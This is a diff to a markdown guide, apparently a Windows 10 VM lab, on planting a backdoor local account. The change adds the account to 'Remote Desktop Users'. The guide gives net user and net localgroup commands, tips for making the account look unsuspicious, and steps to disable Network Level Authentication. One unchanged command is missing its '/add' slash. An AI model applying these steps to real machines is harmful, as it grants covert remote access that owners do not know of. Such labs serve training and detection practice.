@@ -14,9 +14,10 @@ Creating a malicious local account is a simple way to install a backdoor, often 
    ```
    net user svc_network password123 /add
    ```
-3. Add the user to a specific group like "Users". Avoid giving it administrative privileges to make the account less suspicious
+3. Add the user to a specific group like "Users" and "Remote Desktop Users". Avoid giving it administrative privileges to make the account less suspicious
    ```
    net localgroup Users svc_network add
+   net localgroup "Remote Desktop Users" svc_network /add
    ```
 4. To enable RDP (Remote Desktop Protocol) on Windows 10 VM, go to Settings > System > Remote Desktop (left panel). Turn on Enable Remote Desktop. In the Advanced settings,  uncheck the Network Level Authentication as shown below
    ![image](https://github.com/user-attachments/assets/2775be67-8ec5-46b1-842a-2b6fefe6dc84)
